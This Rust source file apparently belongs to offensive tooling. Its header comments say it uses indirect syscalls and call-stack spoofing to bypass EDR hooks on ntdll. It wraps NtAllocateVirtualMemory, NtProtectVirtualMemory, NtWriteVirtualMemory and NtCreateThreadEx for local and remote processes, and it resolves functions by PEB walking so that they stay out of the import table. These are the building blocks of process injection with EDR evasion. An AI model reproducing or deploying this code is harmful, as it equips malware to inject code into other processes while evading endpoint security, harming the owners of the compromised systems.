// Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
// Call stack spoofing via Unwinder by @Kudaes (https://github.com/Kudaes/Unwinder)
// Bypasses EDR hooks on ntdll by calling syscall stubs directly.

#[cfg(target_os = "windows")]
use std::ffi::c_void;

#[cfg(target_os = "windows")]
pub unsafe fn nt_alloc(size: usize, protect: u32) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;

    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size: usize = size;

    let status = dinvoke::nt_allocate_virtual_memory(
        -1isize as *mut c_void, // current process
        &mut base_address,
        0,
        &mut region_size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        protect,
    );

    if status == 0 {
        Ok(base_address)
    } else {
        Err(format!("NtAllocateVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_protect(addr: *mut c_void, size: usize, new_protect: u32) -> Result<u32, String> {
    use dinvoke_rs::dinvoke;

    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;

    let status = dinvoke::nt_protect_virtual_memory(
        -1isize as *mut c_void,
        &mut base,
        &mut region_size,
        new_protect,
        &mut old_protect,
    );

    if status == 0 {
        Ok(old_protect)
    } else {
        Err(format!("NtProtectVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_write_memory(
    process: *mut c_void,
    addr: *mut c_void,
    buffer: &[u8],
) -> Result<usize, String> {
    use dinvoke_rs::dinvoke;

    let mut bytes_written: usize = 0;
    let status = dinvoke::nt_write_virtual_memory(
        process,
        addr,
        buffer.as_ptr() as *mut c_void,
        buffer.len(),
        &mut bytes_written,
    );

    if status == 0 {
        Ok(bytes_written)
    } else {
        Err(format!("NtWriteVirtualMemory: 0x{:X}", status))
    }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_free(addr: *mut c_void) -> Result<(), String> {
    use dinvoke_rs::dinvoke;

    let mut base = addr;
    let mut size: usize = 0;

    let status = dinvoke::nt_free_virtual_memory(
        -1isize as *mut c_void,
        &mut base,
        &mut size,
        0x8000, // MEM_RELEASE
    );

    if status == 0 {
        Ok(())
    } else {
        Err(format!("NtFreeVirtualMemory: 0x{:X}", status))
    }
}

/// Resolve function address via PEB walking (no GetProcAddress in IAT)
#[cfg(target_os = "windows")]
pub unsafe fn resolve_function(module: &str, function: &str) -> Option<usize> {
    use dinvoke_rs::dinvoke;

    let module_base = dinvoke::get_module_base_address(module);
    if module_base == 0 { return None; }

    let addr = dinvoke::get_function_address(module_base, function);
    if addr == 0 { None } else { Some(addr) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_alloc_remote(process: *mut c_void, size: usize, protect: u32) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;
    let mut base_address: *mut c_void = std::ptr::null_mut();
    let mut region_size: usize = size;
    let status = dinvoke::nt_allocate_virtual_memory(process, &mut base_address, 0, &mut region_size, 0x3000, protect);
    if status == 0 { Ok(base_address) } else { Err(format!("NtAllocateVirtualMemory remote: 0x{:X}", status)) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_protect_remote(process: *mut c_void, addr: *mut c_void, size: usize, new_protect: u32) -> Result<u32, String> {
    use dinvoke_rs::dinvoke;
    let mut base = addr;
    let mut region_size = size;
    let mut old_protect: u32 = 0;
    let status = dinvoke::nt_protect_virtual_memory(process, &mut base, &mut region_size, new_protect, &mut old_protect);
    if status == 0 { Ok(old_protect) } else { Err(format!("NtProtectVirtualMemory remote: 0x{:X}", status)) }
}

#[cfg(target_os = "windows")]
pub unsafe fn nt_create_thread(process: *mut c_void, start_address: *mut c_void) -> Result<*mut c_void, String> {
    use dinvoke_rs::dinvoke;
    let mut thread_handle: *mut c_void = std::ptr::null_mut();
    let status = dinvoke::nt_create_thread_ex(
        &mut thread_handle, 0x1FFFFF, std::ptr::null_mut(),
        process, start_address, std::ptr::null_mut(),
        0, 0, 0, 0, std::ptr::null_mut(),
    );
    if status == 0 { Ok(thread_handle) } else { Err(format!("NtCreateThreadEx: 0x{:X}", status)) }
}
